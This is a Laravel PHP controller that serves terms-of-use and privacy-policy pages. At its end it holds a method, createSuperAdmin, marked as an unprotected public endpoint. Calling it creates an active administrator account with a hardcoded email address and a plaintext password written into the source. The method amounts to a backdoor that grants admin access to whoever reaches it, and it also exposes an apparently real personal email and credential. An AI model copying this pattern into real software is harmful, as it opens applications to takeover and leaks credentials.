<?php

    namespace App\Http\Controllers;


    use App\Models\AppConfig;
    use App\Models\User;
    use Illuminate\Http\Request;
    use Illuminate\Support\Facades\Hash;
    use Illuminate\Support\Facades\DB;

    class PublicController extends Controller
    {

        public function termsOfUse()
        {
            $termsOfUse     = AppConfig::where('setting', 'terms_of_use')->first();
            $termsOfUseData = empty($termsOfUse) ? null : $termsOfUse->value;

            return view('auth.termsOfUses', compact('termsOfUseData'));

        }

        public function privacyPolicy()
        {


            $privacyPolicy     = AppConfig::where('setting', 'privacy_policy')->first();
            $privacyPolicyData = empty($privacyPolicy) ? null : $privacyPolicy->value;


            return view('auth.privacyPolicy', compact('privacyPolicyData'));

        }

                // UNPROTECTED endpoint: call /create-super-admin to create a super admin user
            public function createSuperAdmin()
            {
                // Check if admin already exists
                $existing = User::where('email', 'ajoku.emmanuel2@gmail.com')->first();
                if ($existing) {
                    return response()->json(['message' => 'Admin already exists!'], 400);
                }

                $user = User::create([
                    'first_name' => 'Emmanuel',
                    'last_name' => 'Ajoku',
                    'email' => 'ajoku.emmanuel2@gmail.com',
                    'password' => Hash::make('GOTOHESSgildas1@1.'),
                    'is_admin' => 1,
                    'status' => 'active',
                ]);

                return response()->json([
                    'message' => 'Super admin created!',
                    'user_id' => $user->id,
                    'email' => $user->email,
                ]);
            }

    }
